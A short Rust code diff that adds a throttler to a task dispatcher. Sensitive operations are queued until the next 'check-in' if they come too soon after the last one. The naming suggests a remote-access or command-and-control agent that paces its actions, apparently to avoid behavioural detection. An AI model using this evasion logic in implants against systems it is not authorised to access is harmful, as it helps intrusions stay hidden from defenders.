@@ -71,6 +71,27 @@ impl TaskResult {
 
 /// Dispatch a task to the appropriate module handler.
 pub fn dispatch_task(task_id: i64, task_type: &str, args: &serde_json::Value) -> TaskResult {
+    // Check task throttler — if too soon after last sensitive op, queue it
+    let throttler = crate::utils::behavior::throttler();
+    if !throttler.should_execute(task_type) {
+        return TaskResult {
+            task_id,
+            output: "throttled — will retry next check-in".to_string(),
+            output_type: "text".to_string(),
+            status: "queued".to_string(),
+        };
+    }
+
+    let result = dispatch_task_inner(task_id, task_type, args);
+
+    // Record execution time for sensitive tasks
+    throttler.record_execution(task_type);
+
+    result
+}
+
+/// Inner dispatch without throttle checks.
+fn dispatch_task_inner(task_id: i64, task_type: &str, args: &serde_json::Value) -> TaskResult {
     match task_type {
         "host_profile" => host_profile::run(task_id, args),
 
